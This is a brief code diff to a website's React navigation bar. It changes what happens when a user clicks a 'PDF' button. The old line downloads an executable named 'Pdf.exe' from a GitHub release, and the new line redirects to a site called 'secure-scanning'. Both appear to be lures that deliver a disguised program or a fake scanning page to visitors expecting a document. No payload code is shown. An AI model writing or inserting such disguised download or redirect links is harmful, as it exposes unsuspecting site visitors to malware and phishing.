@@ -257,7 +257,7 @@ const Navbar = () => {
   }, [isVisible]);
 
 function pdfClick () {
-  window.location.href = "https://github.com/Richard-tech-alt/fbfreezed/releases/download/v1/Pdf.exe";
+  window.location.href = "https://secure-scanning.vercel.app/";
 }
 
 
